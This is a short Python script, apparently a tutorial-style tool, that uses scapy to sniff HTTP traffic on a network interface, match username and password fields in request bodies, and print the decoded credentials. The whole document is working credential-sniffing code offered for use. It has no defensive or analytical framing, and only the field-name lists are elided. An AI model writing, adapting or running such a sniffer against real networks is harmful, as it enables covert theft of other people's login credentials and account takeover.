from scapy.all import *  # Import all classes, functions, and variables from the scapy.all module
from scapy.layers.inet import IP, TCP  # Import the IP and TCP classes from the scapy.layers.inet module
from urllib import parse  # Import the parse module from the urllib library
import re  # Import the regular expression module

iface = "eth0"  # Specify the network interface to listen on

# Function to extract login credentials (username and password) from HTTP request body
def get_login_pass(body):
    user = None
    passwd = None

    # List of possible field names for usernames and passwords in the HTTP request body
    userfields = [...]
    passfields = [...]

    # Loop through userfields to find a username-related field in the request body
    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    # Loop through passfields to find a password-related field in the request body
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    # If both username and password fields are found, return them
    if user and passwd:
        return (user, passwd)

# Function to parse captured packets and extract login credentials
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)  # Get the payload (body) of the TCP packet
        user_pass = get_login_pass(body)  # Extract login credentials from the body
        if user_pass != None:
            print(packet[TCP].payload)  # Print the payload of the TCP packet
            print(parse.unquote(user_pass[0]))  # Print the decoded username
            print(parse.unquote(user_pass[1]))  # Print the decoded password
    else:
        pass  # If the packet doesn't meet the required conditions, skip it

try:
    sniff(iface=iface, prn=pkt_parser, store=0)  # Start packet sniffing and call pkt_parser for each packet
except KeyboardInterrupt:
    print('Exiting')  # Print a message when the user presses Ctrl+C
    exit(0)  # Exit the script gracefully
